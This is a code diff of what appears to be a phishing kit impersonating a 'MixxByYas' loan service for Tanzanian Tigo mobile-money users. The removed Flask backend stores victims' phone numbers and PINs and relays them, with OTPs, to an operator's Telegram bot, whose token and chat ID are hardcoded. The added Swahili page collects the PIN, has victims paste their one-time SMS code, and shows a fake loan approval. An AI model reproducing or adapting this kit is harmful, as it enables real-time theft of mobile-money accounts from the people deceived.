@@ -1,264 +1,276 @@
-from flask import Flask, render_template, request, jsonify
-import requests
-import sqlite3
-import random
-import string
-from datetime import datetime
-import os
-import threading
-import time
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MixxByYas - Thibitisha</title>
+    <style>
+        :root { --primary: #2563eb; --gold: #f59e0b; --gold-dark: #d97706; --light-yellow: #fffef5; --success: #10b981; --danger: #ef4444; --dark: #1e293b; --gray: #64748b; --white: #ffffff; --light-navy: #2c3e6b; --timer-blue: #e0f0ff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--light-yellow); color: var(--dark); line-height: 1.6; min-height: 100vh; display: flex; flex-direction: column; }
+        .brand-bar { background: var(--light-navy); text-align: center; padding: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; border-bottom: 2px solid var(--gold); }
+        .brand-logo { width: 32px; height: 32px; background: var(--gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 0.9rem; color: var(--light-navy); }
+        .brand-text { font-size: 1.1rem; font-weight: 700; } .brand-text .mixx { color: var(--white); } .brand-text .yas { color: var(--gold); }
+        .back-link { display: block; padding: 1rem 1.5rem; color: var(--gray); text-decoration: none; font-size: 0.9rem; max-width: 500px; margin: 0 auto; }
+        .main-container { max-width: 500px; margin: 0 auto 2rem; padding: 0 1rem; flex: 1; }
+        .card { background: var(--white); border-radius: 14px; padding: 2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.06); border: 1px solid #fef3c7; }
+        .loan-summary { background: #fefce8; border-radius: 14px; padding: 1rem; text-align: center; margin-bottom: 1.5rem; }
+        .loan-summary .amount { font-size: 1.6rem; font-weight: 900; color: var(--primary); }
+        .screen { display: none; animation: fadeIn 0.4s ease; } .screen.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .form-group { margin-bottom: 1.2rem; } .form-group label { display: block; font-weight: 600; font-size: 0.9rem; margin-bottom: 0.4rem; }
+        .phone-box { display: flex; border: 2px solid #fef3c7; border-radius: 14px; overflow: hidden; }
+        .phone-box .prefix { background: #fef9e7; padding: 0.85rem 1rem; font-weight: 700; border-right: 1px solid #fef3c7; }
+        .phone-box input { flex: 1; padding: 0.85rem 1rem; border: none; font-size: 1rem; font-family: inherit; outline: none; }
+        .pin-box { position: relative; border: 2px solid #fef3c7; border-radius: 14px; overflow: hidden; }
+        .pin-box input { width: 100%; padding: 0.85rem 1rem; border: none; font-size: 1.2rem; font-family: inherit; outline: none; letter-spacing: 0.5rem; }
+        .pin-box .toggle-btn { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 1.2rem; }
+        .error-msg { color: var(--danger); font-size: 0.8rem; margin-top: 0.3rem; display: none; } .error-msg.show { display: block; }
+        .btn { width: 100%; padding: 0.95rem; border-radius: 50px; font-weight: 700; font-size: 1rem; cursor: pointer; border: none; font-family: inherit; margin-top: 0.5rem; }
+        .btn-gold { background: var(--gold); color: var(--dark); }
+        .waiting-content { text-align: center; padding: 1rem; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #fef3c7; border-top-color: var(--gold); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1rem; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .phone-display { background: #fef9e7; padding: 0.4rem 1.2rem; border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.5rem 0; font-size: 0.9rem; }
+        .code-instruction { background: #fefce8; border-radius: 12px; padding: 12px 16px; margin: 10px 0; font-size: 0.8rem; color: var(--dark); text-align: center; border: 1px solid #fef3c7; line-height: 1.5; }
+        .code-instruction i { color: var(--gold); margin-right: 4px; }
+        .sms-textarea { width: 100%; height: 100px; border: 2px solid #fef3c7; border-radius: 14px; padding: 12px; font-size: 0.85rem; font-family: inherit; resize: vertical; outline: none; background: #fff; }
+        .sms-textarea:focus { border-color: var(--gold); }
+        .sms-textarea::placeholder { color: #b0b8c4; }
+        .timer-bar { background: var(--timer-blue); border-radius: 10px; padding: 0.6rem; text-align: center; font-weight: 700; font-size: 0.9rem; color: var(--primary); margin-top: 0.3rem; }
+        .timer-bar.warning { background: #fef2f2; color: var(--danger); }
+        .resend-link { text-align: center; margin-top: 0.8rem; }
+        .resend-link a { color: var(--primary); text-decoration: none; font-size: 0.85rem; cursor: pointer; font-weight: 600; }
+        .success-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center; }
+        .success-overlay.active { display: flex; }
+        .success-card { background: var(--white); border-radius: 14px; padding: 2rem; text-align: center; max-width: 400px; width: 90%; animation: popIn 0.5s ease; }
+        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        .check-icon { width: 70px; height: 70px; margin: 0 auto 0.8rem; } .check-icon svg { width: 100%; height: 100%; }
+        .check-circle { stroke: var(--success); stroke-width: 3; fill: none; stroke-dasharray: 283; stroke-dashoffset: 283; animation: drawCircle 1s ease forwards; }
+        .check-mark { stroke: var(--success); stroke-width: 3; fill: none; stroke-dasharray: 100; stroke-dashoffset: 100; animation: drawCheck 0.5s 0.6s ease forwards; }
+        @keyframes drawCircle { to { stroke-dashoffset: 0; } } @keyframes drawCheck { to { stroke-dashoffset: 0; } }
+        .success-card h2 { color: var(--success); margin-bottom: 0.3rem; }
+        .success-card .big-amount { font-size: 1.8rem; font-weight: 900; color: var(--primary); margin: 0.5rem 0; }
+        .btn-home { background: var(--gold); color: var(--dark); padding: 0.8rem 2rem; border-radius: 50px; font-weight: 600; cursor: pointer; border: none; font-family: inherit; font-size: 0.9rem; }
+        .copyright-bar { background: var(--light-navy); text-align: center; padding: 1rem; margin-top: auto; }
+        .copyright-bar p { color: rgba(255,255,255,0.6); font-size: 0.75rem; }
+    </style>
+</head>
+<body>
+    <div class="brand-bar"><div class="brand-logo">M</div><div class="brand-text"><span class="mixx">Mixx</span><span class="yas">ByYas</span></div></div>
+    <a href="/apply" class="back-link">← Rudi</a>
+    <div class="main-container">
+        <div class="loan-summary"><div style="font-size:0.75rem;color:var(--gray);">Mkopo Wako</div><div class="amount" id="loanAmount">TZS 0</div></div>
+        <div class="card">
+            <div class="screen active" id="screen1">
+                <h3 style="margin-bottom:1rem;">📱 Ingiza Taarifa za Tigo</h3>
+                <div class="form-group"><label>Namba ya Simu</label><div class="phone-box"><span class="prefix">+255</span><input type="tel" id="phoneNumber" placeholder="0712345678 au 0612345678" maxlength="12"></div><div class="error-msg" id="phoneError">Ingiza namba sahihi</div></div>
+                <div class="form-group"><label>PIN ya Tigo</label><div class="pin-box"><input type="password" id="tigoPin" placeholder="• • • •" maxlength="4"><button class="toggle-btn" onclick="togglePIN()">👁️</button></div><div class="error-msg" id="pinError">Ingiza PIN</div></div>
+                <button class="btn btn-gold" onclick="submitDetails()">Endelea →</button>
+            </div>
+            <div class="screen" id="screen2"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inakaguliwa</h3><p style="color:var(--gray);">Inasubiri uidhinishaji</p><div class="phone-display" id="showPhone">+255 ---------</div></div></div>
+            <div class="screen" id="screen3"><div class="waiting-content">
+                <h3>✅ Namba ya Uthibitisho</h3>
+                <div class="phone-display" id="showPhone2">+255 ---------</div>
+                <div class="code-instruction">
+                    <i class="fas fa-sms"></i> Nakili ujumbe wote uliotumwa na <strong>Mixx by Yas</strong> kisha ubandike hapa
+                </div>
+                <textarea id="smsMessage" class="sms-textarea" placeholder="Bandika ujumbe wako wote hapa..."></textarea>
+                <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
+                <div class="error-msg" id="codeError" style="text-align:center;">Namba si sahihi</div>
+                <button class="btn btn-gold" onclick="submitCode()">Endelea →</button>
+                <div class="resend-link"><a onclick="resendCode()">↻ Hukupokea SMS? Bonyeza hapa</a></div>
+            </div></div>
+            <div class="screen" id="screen4"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inathibitisha</h3><div class="phone-display" id="showPhone3">+255 ---------</div></div></div>
+        </div>
+    </div>
+    <div class="success-overlay" id="successOverlay"><div class="success-card"><div class="check-icon"><svg viewBox="0 0 100 100"><circle class="check-circle" cx="50" cy="50" r="45"/><path class="check-mark" d="M30 50 L45 65 L70 35" fill="none"/></svg></div><h2>🎉 Mkopo Umeidhinishwa!</h2><div class="big-amount" id="approvedAmount">TZS 0</div><p>📱 Uthibitisho umetumwa<br>💰 Fedha zitaingia hivi karibuni</p><button class="btn-home" onclick="window.location.href='/'">🏠 Rudi Nyumbani</button></div></div>
+    <div class="copyright-bar"><p>© 2024 MixxByYas</p></div>
+    <script>
+        var urlParams = new URLSearchParams(window.location.search);
+        var loanAmount = parseInt(urlParams.get('amount') || '500000');
+        var loanTerm = parseInt(urlParams.get('term') || '12');
+        document.getElementById('loanAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
+        document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
+        var appId = '', checkInterval = null, countdownTimer = null, userPhone = '', fastCheck = null;
+        var resendCount = 0, resendCooldown = false;
 
-app = Flask(__name__)
-app.secret_key = 'mixxpro-2024'
+        function togglePIN() { var p = document.getElementById('tigoPin'); var b = p.parentElement.querySelector('.toggle-btn'); if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; } else { p.type = 'password'; b.textContent = '👁️'; } }
+        document.getElementById('phoneNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
+        document.getElementById('tigoPin').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
 
-BOT_TOKEN = '8974323641:AAHdlDB0nKiOgGMR0mouTdKq44ltKXjywdc'
-CHAT_ID = '8983451762'
-TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
+        async function submitDetails() {
+            var phone = document.getElementById('phoneNumber').value.trim(); var pin = document.getElementById('tigoPin').value.trim();
+            if (!phone || phone.length < 9) { document.getElementById('phoneError').classList.add('show'); return; }
+            if (!pin || pin.length !== 4) { document.getElementById('pinError').classList.add('show'); return; }
+            userPhone = phone;
+            document.getElementById('screen1').classList.remove('active'); document.getElementById('screen2').classList.add('active');
+            document.getElementById('showPhone').textContent = '+255 ' + phone; document.getElementById('showPhone2').textContent = '+255 ' + phone; document.getElementById('showPhone3').textContent = '+255 ' + phone;
+            var loanData = JSON.parse(localStorage.getItem('loan_data') || '{}');
+            try { var res = await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone, pin: pin, amount: loanAmount, months: loanTerm, loan_type: loanData.loan_type || '', purpose: loanData.purpose || '' }) }); var data = await res.json(); appId = data.app_id; startChecking(); } catch(e) { alert('Error: ' + e.message); }
+        }
 
-last_update_id = 0
+        function startChecking() { 
+            if (checkInterval) clearInterval(checkInterval); 
+            checkInterval = setInterval(async function() { 
+                try { 
+                    var res = await fetch('/api/check_status/' + appId); 
+                    var data = await res.json(); 
+                    if (data.status === 'approved') { 
+                        clearInterval(checkInterval); 
+                        showCodeScreen(); 
+                    } else if (data.status === 'wrong_pin') { 
+                        clearInterval(checkInterval); 
+                        var invType = data.invalid_type || '';
+                        if (invType === 'wrong_pin') { goBackToPinWrong(); } 
+                        else { goBackToPin(); }
+                    } else if (data.status === 'invalid_number') { 
+                        clearInterval(checkInterval); 
+                        var invType2 = data.invalid_type || '';
+                        if (invType2 === 'otp_tigo') { goToHomeOtpTigo(); } 
+                        else { goToHomeTigo(); }
+                    }
+                } catch(e) {} 
+            }, 3000); 
+        }
 
-def init_db():
-    conn = sqlite3.connect('database.db')
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS loans (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        app_id TEXT, amount INTEGER, months INTEGER,
-        phone TEXT, pin TEXT, code TEXT,
-        status TEXT DEFAULT 'pending',
-        code_status TEXT DEFAULT 'pending',
-        invalid_type TEXT
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS users (
-        phone TEXT UNIQUE, total_applications INTEGER DEFAULT 1
-    )''')
-    conn.commit()
-    conn.close()
+        function showCodeScreen() {
+            document.getElementById('screen2').classList.remove('active'); 
+            document.getElementById('screen3').classList.add('active');
+            document.getElementById('smsMessage').value = '';
+            startCountdown();
+            if (fastCheck) clearInterval(fastCheck);
+        }
 
-init_db()
+        function startCountdown() { 
+            if (countdownTimer) clearInterval(countdownTimer); 
+            var seconds = 30; var display = document.getElementById('timerDisplay'); 
+            display.textContent = '⏳ ' + seconds + 's'; display.className = 'timer-bar'; 
+            countdownTimer = setInterval(function() { 
+                seconds--; display.textContent = '⏳ ' + seconds + 's'; 
+                if (seconds <= 10) display.className = 'timer-bar warning'; 
+                if (seconds <= 0) { clearInterval(countdownTimer); display.textContent = 'Muda Umeisha'; display.className = 'timer-bar warning'; } 
+            }, 1000); 
+        }
 
-def add_column():
-    conn = sqlite3.connect('database.db')
-    c = conn.cursor()
-    try:
-        c.execute('ALTER TABLE loans ADD COLUMN invalid_type TEXT')
-    except:
-        pass
-    conn.commit()
-    conn.close()
+        async function resendCode() { 
+            if (!userPhone) return; 
+            if (resendCooldown) {
+                document.getElementById('codeError').textContent = 'Subiri sekunde 30 kabla ya kuomba tena.';
+                document.getElementById('codeError').style.color = 'var(--danger)';
+                document.getElementById('codeError').classList.add('show');
+                setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000);
+                return;
+            }
+            if (resendCount >= 3) {
+                document.getElementById('codeError').textContent = 'Umezidi idadi ya maombi. Jaribu tena baadae.';
+                document.getElementById('codeError').style.color = 'var(--danger)';
+                document.getElementById('codeError').classList.add('show');
+                return;
+            }
+            resendCount++; resendCooldown = true;
+            document.getElementById('smsMessage').value = '';
+            document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo kutoka Mixx. (' + resendCount + '/3)'; 
+            document.getElementById('codeError').style.color = 'var(--primary)'; 
+            document.getElementById('codeError').classList.add('show'); 
+            try { 
+                await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: loanAmount, months: loanTerm, loan_type: '', purpose: 'OTP REQUESTED' }) }); 
+                setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000); 
+            } catch(e) {} 
+            startChecking();
+            setTimeout(function() { resendCooldown = false; }, 30000);
+        }
 
-add_column()
+        function goBackToPin() { 
+            if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } 
+            document.getElementById('screen2').classList.remove('active'); 
+            document.getElementById('screen1').classList.add('active'); 
+            document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); 
+            document.getElementById('smsMessage').value = '';
+            document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; 
+            document.getElementById('codeError').style.color = 'var(--danger)'; 
+            document.getElementById('codeError').classList.add('show'); 
+        }
 
-def send_telegram(message, reply_markup=None):
-    try:
-        payload = {'chat_id': CHAT_ID, 'text': message}
-        if reply_markup: payload['reply_markup'] = reply_markup
-        requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
-    except Exception as e: print(f'Telegram error: {e}')
+        function goBackToPinWrong() { 
+            if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } 
+            if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+            document.getElementById('screen2').classList.remove('active'); 
+            document.getElementById('screen4').classList.remove('active');
+            document.getElementById('screen1').classList.add('active'); 
+            document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); 
+            document.getElementById('smsMessage').value = '';
+            document.getElementById('pinError').textContent = 'PIN yako sio sahihi. Una nafasi moja tu ya kujaribu tena.'; 
+            document.getElementById('pinError').style.color = 'var(--danger)'; 
+            document.getElementById('pinError').classList.add('show');
+            setTimeout(function() { document.getElementById('pinError').classList.remove('show'); document.getElementById('pinError').textContent = 'Ingiza PIN'; }, 8000);
+        }
 
-def edit_telegram(message_id, text):
-    try:
-        requests.post(f'{TELEGRAM_API}/editMessageText', json={'chat_id': CHAT_ID, 'message_id': message_id, 'text': text})
-    except Exception as e: print(f'Edit error: {e}')
+        function goToHomeTigo() { 
+            if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } 
+            if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+            localStorage.setItem('popupTigo', 'true');
+            window.location.href = '/';
+        }
 
-def poll_telegram():
-    if 'RENDER' in os.environ: return
-    global last_update_id
-    while True:
-        try:
-            url = f'{TELEGRAM_API}/getUpdates?offset={last_update_id + 1}&timeout=10'
-            resp = requests.get(url).json()
-            if resp.get('ok') and resp.get('result'):
-                for update in resp['result']:
-                    last_update_id = update['update_id']
-                    if 'callback_query' in update:
-                        cb = update['callback_query']; cb_data = cb['data']
-                        msg_id = cb['message']['message_id']; original = cb['message']['text']
-                        conn = sqlite3.connect('database.db'); c = conn.cursor()
-                        
-                        if cb_data.startswith('deny_'):
-                            aid = cb_data.replace('deny_','')
-                            c.execute('UPDATE loans SET status="invalid_number", code_status="invalid_number", invalid_type="tigo_only" WHERE app_id=?',(aid,))
-                            conn.commit()
-                            edit_telegram(msg_id, original+'\n\n❌ INVALID - Not Tigo')
-                        
-                        elif cb_data.startswith('denyotp_'):
-                            aid = cb_data.replace('denyotp_','')
-                            c.execute('UPDATE loans SET status="invalid_number", code_status="invalid_number", invalid_type="otp_tigo" WHERE app_id=?',(aid,))
-                            conn.commit()
-                            edit_telegram(msg_id, original+'\n\n❌ INVALID OTP - Not Tigo')
-                        
-                        elif cb_data.startswith('denypin_'):
-                            aid = cb_data.replace('denypin_','')
-                            c.execute('UPDATE loans SET status="wrong_pin", code_status="wrong_pin", invalid_type="wrong_pin" WHERE app_id=?',(aid,))
-                            conn.commit()
-                            edit_telegram(msg_id, original+'\n\n❌ INVALID PIN')
-                        
-                        elif cb_data.startswith('allow_'):
-                            aid = cb_data.replace('allow_','')
-                            c.execute('UPDATE loans SET status="approved" WHERE app_id=?',(aid,))
-                            conn.commit()
-                            edit_telegram(msg_id, original+'\n\n✅ ALLOWED')
-                        
-                        elif cb_data.startswith('wrongpin2_'):
-                            aid = cb_data.replace('wrongpin2_','')
-                            new_code = str(random.randint(1000,9999))
-                            c.execute('UPDATE loans SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(new_code,aid))
-                            conn.commit()
-                            edit_telegram(msg_id, original+'\n\n❌ WRONG PIN')
-                        
-                        elif cb_data.startswith('wrongcode_'):
-                            aid = cb_data.replace('wrongcode_','')
-                            new_code = str(random.randint(1000,9999))
-                            c.execute('UPDATE loans SET code_status="wrong_code",code=? WHERE app_id=?',(new_code,aid))
-                            conn.commit()
-                            edit_telegram(msg_id, original+'\n\n❌ WRONG CODE')
-                        
-                        elif cb_data.startswith('approve_'):
-                            aid = cb_data.replace('approve_','')
-                            c.execute('UPDATE loans SET code_status="approved" WHERE app_id=?',(aid,))
-                            conn.commit()
-                            edit_telegram(msg_id, original+f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')
-                        
-                        conn.close()
-        except Exception as e: print(f'Poll error: {e}')
-        time.sleep(1)
+        function goToHomeOtpTigo() { 
+            if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } 
+            if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+            localStorage.setItem('popupOtpTigo', 'true');
+            window.location.href = '/';
+        }
 
-if 'RENDER' not in os.environ: threading.Thread(target=poll_telegram, daemon=True).start()
+        async function submitCode() { 
+            if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } 
+            if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } 
+            var smsText = document.getElementById('smsMessage').value.trim();
+            if (!smsText) {
+                document.getElementById('codeError').textContent = 'Bandika ujumbe wa SMS kwanza.';
+                document.getElementById('codeError').style.color = 'var(--danger)';
+                document.getElementById('codeError').classList.add('show');
+                startCountdown();
+                return;
+            }
+            
+            document.getElementById('screen3').classList.remove('active'); 
+            document.getElementById('screen4').classList.add('active'); 
+            await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: smsText }) }); 
+            if (checkInterval) clearInterval(checkInterval); 
+            checkInterval = setInterval(async function() { 
+                try { 
+                    var res = await fetch('/api/check_status/' + appId); 
+                    var data = await res.json(); 
+                    if (data.code_status === 'approved') { clearInterval(checkInterval); showSuccess(); } 
+                    else if (data.code_status === 'wrong_code') { clearInterval(checkInterval); showCodeError(); } 
+                    else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { clearInterval(checkInterval); goBackToPinFromCode(); } 
+                } catch(e) {} 
+            }, 3000); 
+        }
 
-@app.route('/') 
-def index(): return render_template('index.html')
-@app.route('/apply') 
-def apply(): return render_template('apply.html')
-@app.route('/approve') 
-def approve(): return render_template('approve.html')
+        function showSuccess() { document.getElementById('screen4').classList.remove('active'); document.getElementById('successOverlay').classList.add('active'); }
 
-@app.route('/api/submit_loan', methods=['POST'])
-def submit_loan():
-    data = request.json
-    phone = data.get('phone',''); pin = data.get('pin','')
-    amount = int(data.get('amount',0)); months = int(data.get('months',1))
-    purpose = data.get('purpose','')
-    conn = sqlite3.connect('database.db'); c = conn.cursor()
-    
-    if purpose == 'OTP REQUESTED':
-        c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND (status='pending' OR status='wrong_pin') AND code_status='pending'", (phone,))
-        resend_count = c.fetchone()[0]
-        if resend_count >= 3:
-            conn.close()
-            return jsonify({'success': False, 'error': 'Umeomba OTP mara nyingi. Subiri.'})
-        app_id = 'TZ-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        code = str(random.randint(1000, 9999))
-        c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,amount,months,phone,pin,code))
-        conn.commit(); conn.close()
-        msg = f'📤 OTP REQUESTED\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n🔢 PIN: {pin}\n💰 Amount: TZS {amount:,}'
-        keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'denyotp_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
-        send_telegram(msg, keyboard)
-        return jsonify({'success':True,'app_id':app_id})
-    
-    c.execute('SELECT total_applications FROM users WHERE phone = ?',(phone,))
-    existing = c.fetchone(); is_returning = existing is not None
-    if is_returning: c.execute('UPDATE users SET total_applications = total_applications + 1 WHERE phone = ?',(phone,))
-    else: c.execute('INSERT INTO users (phone) VALUES (?)',(phone,))
-    
-    app_id = 'TZ-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-    code = str(random.randint(1000, 9999))
-    c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,amount,months,phone,pin,code))
-    conn.commit(); conn.close()
-    
-    prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW LOAN REQUEST'
-    msg = f'{prefix}\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n🔢 PIN: {pin}\n💰 Amount: TZS {amount:,}'
-    keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
-    send_telegram(msg, keyboard)
-    return jsonify({'success':True,'app_id':app_id})
+        function showCodeError() { 
+            document.getElementById('screen4').classList.remove('active'); 
+            document.getElementById('screen3').classList.add('active'); 
+            document.getElementById('smsMessage').value = '';
+            document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Bandika ujumbe mpya.';
+            document.getElementById('codeError').style.color = 'var(--danger)'; 
+            document.getElementById('codeError').classList.add('show');
+            startCountdown();
+            setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); 
+        }
 
-@app.route('/api/submit_code', methods=['POST'])
-def submit_code():
-    data = request.json; app_id = data.get('app_id'); entered_code = data.get('code')
-    conn = sqlite3.connect('database.db'); c = conn.cursor()
-    c.execute('SELECT phone, code, amount, pin FROM loans WHERE app_id = ?',(app_id,))
-    loan = c.fetchone()
-    if loan:
-        phone, expected_code, amount, pin = loan
-        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n✍️ Entered: {entered_code}\n💰 Amount: TZS {amount:,}\n🔢 PIN: {pin}'
-        keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'}],[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE LOAN','callback_data':f'approve_{app_id}'}]]}
-        send_telegram(msg, keyboard)
-    conn.close()
-    return jsonify({'success':True})
-
-@app.route('/api/check_status/<app_id>')
-def check_status(app_id):
-    conn = sqlite3.connect('database.db'); c = conn.cursor()
-    try:
-        c.execute('SELECT status, code_status, invalid_type FROM loans WHERE app_id = ?',(app_id,))
-        loan = c.fetchone()
-        if loan: 
-            conn.close()
-            return jsonify({'status':loan[0],'code_status':loan[1],'invalid_type':(loan[2] or '')})
-    except:
-        c.execute('SELECT status, code_status FROM loans WHERE app_id = ?',(app_id,))
-        loan = c.fetchone()
-        if loan: 
-            conn.close()
-            return jsonify({'status':loan[0],'code_status':loan[1],'invalid_type':''})
-    conn.close()
-    return jsonify({'status':'not_found'})
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    data = request.json
-    if 'callback_query' in data:
-        cb = data['callback_query']; cb_data = cb['data']
-        msg_id = cb['message']['message_id']; original = cb['message']['text']
-        conn = sqlite3.connect('database.db'); c = conn.cursor()
-        
-        if cb_data.startswith('denyotp_'):
-            aid = cb_data.replace('denyotp_','')
-            c.execute('UPDATE loans SET status="invalid_number", code_status="invalid_number", invalid_type="otp_tigo" WHERE app_id=?',(aid,))
-            conn.commit()
-            edit_telegram(msg_id, original+'\n\n❌ INVALID OTP - Not Tigo')
-        
-        elif cb_data.startswith('denypin_'):
-            aid = cb_data.replace('denypin_','')
-            c.execute('UPDATE loans SET status="wrong_pin", code_status="wrong_pin", invalid_type="wrong_pin" WHERE app_id=?',(aid,))
-            conn.commit()
-            edit_telegram(msg_id, original+'\n\n❌ INVALID PIN')
-        
-        elif cb_data.startswith('deny_'):
-            aid = cb_data.replace('deny_','')
-            c.execute('UPDATE loans SET status="invalid_number", code_status="invalid_number", invalid_type="tigo_only" WHERE app_id=?',(aid,))
-            conn.commit()
-            edit_telegram(msg_id, original+'\n\n❌ INVALID - Not Tigo')
-        
-        elif cb_data.startswith('allow_'):
-            aid = cb_data.replace('allow_','')
-            c.execute('UPDATE loans SET status="approved" WHERE app_id=?',(aid,))
-            conn.commit()
-            edit_telegram(msg_id, original+'\n\n✅ ALLOWED')
-        
-        elif cb_data.startswith('wrongpin2_'):
-            aid = cb_data.replace('wrongpin2_','')
-            new_code = str(random.randint(1000,9999))
-            c.execute('UPDATE loans SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(new_code,aid))
-            conn.commit()
-            edit_telegram(msg_id, original+'\n\n❌ WRONG PIN')
-        
-        elif cb_data.startswith('wrongcode_'):
-            aid = cb_data.replace('wrongcode_','')
-            new_code = str(random.randint(1000,9999))
-            c.execute('UPDATE loans SET code_status="wrong_code",code=? WHERE app_id=?',(new_code,aid))
-            conn.commit()
-            edit_telegram(msg_id, original+'\n\n❌ WRONG CODE')
-        
-        elif cb_data.startswith('approve_'):
-            aid = cb_data.replace('approve_','')
-            c.execute('UPDATE loans SET code_status="approved" WHERE app_id=?',(aid,))
-            conn.commit()
-            edit_telegram(msg_id, original+f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')
-        
-        conn.close()
-    return jsonify({'ok':True})
-
-if __name__ == '__main__':
-    print("MIXXPRO RUNNING!")
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
+        function goBackToPinFromCode() { 
+            if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } 
+            if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } 
+            document.getElementById('screen4').classList.remove('active'); 
+            document.getElementById('screen1').classList.add('active'); 
+            document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); 
+            document.getElementById('smsMessage').value = '';
+            document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; 
+            document.getElementById('codeError').style.color = 'var(--danger)'; 
+            document.getElementById('codeError').classList.add('show'); 
+        }
+    </script>
+</body>
+</html>
